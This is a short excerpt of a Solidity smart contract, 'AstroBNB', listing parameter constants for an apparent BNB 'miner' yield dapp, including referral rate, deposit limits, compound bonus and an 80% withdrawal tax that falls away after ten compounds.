...
contract AstroBNB {
    ...
    /** base parameters **/
    uint256 public EGGS_TO_HIRE_1MINERS = 479520; /** 18%  **/
    uint256 public REFERRAL = 60; /** 6%  **/
    uint256 public PERCENTS_DIVIDER = 1000; 
    uint256 public TAX = 100; /** 10% **/
    uint256 public MARKET_EGGS_DIVISOR = 2;

    uint256 public MIN_INVEST_LIMIT = 5 * 1e16; /** 0.05 BNB  **/
    uint256 public WALLET_DEPOSIT_LIMIT = 25 * 1e18; /** 25 BNB  **/

    uint256 public COMPOUND_BONUS = 20; /** 20% Compound Bonus  **/
    uint256 public COMPOUND_BONUS_MAX_TIMES = 10; /** 10x Compound for max bonus  **/
    uint256 public COMPOUND_STEP = 12 * 60 * 60; /** One compound per 12H  **/

    uint256 public WITHDRAWAL_TAX = 800; /** Withdraw tax 80% without compounding  **/
    uint256 public COMPOUND_FOR_NO_TAX_WITHDRAWAL = 10; /** 10x Compound to withdraw without TAX  **/
